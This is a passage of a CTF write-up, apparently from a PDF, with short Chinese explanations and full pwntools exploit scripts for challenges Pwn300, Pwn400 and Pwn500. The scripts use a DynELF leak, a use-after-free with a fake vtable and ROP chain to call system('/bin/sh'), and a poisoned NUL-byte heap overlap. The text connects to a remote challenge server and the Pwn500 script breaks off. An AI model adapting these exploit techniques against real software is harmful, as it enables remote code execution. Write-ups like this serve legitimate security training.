    recursive()
    dynelf = DynELF(leak, elf=ELF("./pwn300kh6y5gt3treg"))
    #r = leak(0x601018)
    #hexdump(r)
    libgetshell = dynelf.lookup(None, "libgetshell")
    getshell = dynelf.lookup('getshell', 'libgetshell')
    info("Libgetshell = " + hex(libgetshell))
    info("Getshell = " + hex(getshell))
    ru('fuck me!\n')
    payload = 40 * 'a' + p64(getshell)
    sn(payload.ljust(0xa0))
    '''
    f = open('libgetshell.dump', 'wb')
    while 1:
        f.write(leak(libgetshell, 0x1000))
        libgetshell += 0x1000
    '''
    io.interactive()
    return
if __name__ == '__main__':
    pwn()
⼀一个C++写的rsa加解密程序，在解密的时候可以泄露露keypair(在堆上)的地址，同
时解密完后会有uaf。在堆上构造fake vtable，uaf占位即可。
脚本：
Pwn400 
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
from hexdump import hexdump
import os, sys
# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1
# modify this
if LOCAL:
    io = process('./pwn400')
else:
    io = remote('119.28.62.216',10023)
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)
def rn(count):
    return io.recvn(count)
def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf
def sl(data):
    return io.sendline(data)
def sn(data):
    return io.send(data)
def info(string):
    return log.info(string)
def dehex(s):
    return s.replace(' ','').decode('hex')
def limu8(x):
    return c_uint8(x).value
def limu16(x):
    return c_uint16(x).value
def limu32(x):
    return c_uint32(x).value
# define interactive functions here
def menu():
    return ru('exit\n')
def addcipher(keychain='0',p=3,q=5):
    menu()
    sl('1')
    ru('No\n')
    sl(keychain)
    if keychain == '1':
        ru('p:')
        sl(str(p))
        ru('q:')
        sl(str(q))
    return
def encrypt(length,data):
    menu()
    sl('2')
    ru(')\n')
    sl(str(length))
    ru('\n')
    sn(data)
    return
def decrypt(length,data):
    menu()
    sl('3')
    ru(')\n')
    sl(str(length))
    ru('text\n')
    sn(data)
    return
def comment(data):
    menu()
    sl('4')
    ru('RSA')
    sn(data)
    return
# define exploit function here
def pwn():
    if DEBUG: gdb.attach(io)
    addcipher(keychain='1')
    encrypt(64, 64*'a')
    ru(': ')
    rn(512)
    heapleak = u64(ru('\n')[:-1].ljust(8,'\x00'))
    heap = heapleak - 0x270
    info("Heap Leak = " + hex(heap))
    decrypt(64, 128*'0')    # uaf
    fake_vtable = heap + 0x40
    payload = p64(fake_vtable) + 5 * p64(1) + p64(0xdeadbeef) *
 4 + p64(0x0000000000401245) + p64(0x401245)
    payload = payload.ljust(128)
    comment(payload)
    poprdi = 0x0000000000402343
    ropchain = p64(poprdi)
    ropchain += p64(0x604018)
    ropchain += p64(0x400BE0)
    ropchain += p64(0x401D9D)   # back to main
    decrypt(256,ropchain.ljust(512))
    offset___libc_start_main_ret = 0x21ec5
    offset_system = 0x00000000000468f0
    offset_dup2 = 0x00000000000ece70
    offset_read = 0x00000000000ec690
    offset_write = 0x00000000000ec6f0
    offset_str_bin_sh = 0x17dbc5
    '''
    offset___libc_start_main_ret = 0x21f45
    offset_system = 0x0000000000046590
    offset_dup2 = 0x00000000000ebe90
    offset_read = 0x00000000000eb6a0
    offset_write = 0x00000000000eb700
    offset_str_bin_sh = 0x17c8c3
    '''
    #offset_printf = 0x0000000000054340
    offset_printf = 0x00000000000546b0
    libc = u64(rn(6).ljust(8, '\x00')) - offset_printf
    info("Libc = " + hex(libc))
    ropchain = p64(poprdi)
    ropchain += p64(libc + offset_str_bin_sh)
    ropchain += p64(libc + offset_system)
    decrypt(256, ropchain.ljust(512))
    io.interactive()
    return
if __name__ == '__main__':
    pwn()
漏漏洞洞点在读⼊入固定⻓长度内容时有nullbyte oﬀ-by-one。利利⽤用⽅方式和google project
zero的https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-
2014-edition.html 这篇⽂文章相似，通过伪造prev_size和in_use位来达到chunk
overlapping的效果。具体利利⽤用⻅见脚本：
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
import os, sys
os.environ['LD_PRELOAD'] = './libc_xd.so'
# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1
# modify this
if LOCAL:
    io = process('./pwn500')
else:
    io = remote('119.28.62.216',10024)
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)
def rn(count):
    return io.recvn(count)
Pwn500 
def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf
def sl(data):
    return io.sendline(data)
def sn(data):
    return io.send(data)
def info(string):
    return log.info(string)
def dehex(s):
    return s.replace(' ','').decode('hex')
def limu8(x):
    return c_uint8(x).value
def limu16(x):
    return c_uint16(x).value
def limu32(x):
    return c_uint32(x).value
# define interactive functions here
def enterGame(char='y'):
    ru('n)?\n')
    sl(char)
    return
def menu():
    return ru(':')
def senderinfo(name,contact):
    menu()
    sl('1')
    ru('?')
    sn(name)
    ru('?')
    sn(contact)
    return
def submitpack():
    menu()
    sl('6')
    return
def showrcvr():
    menu()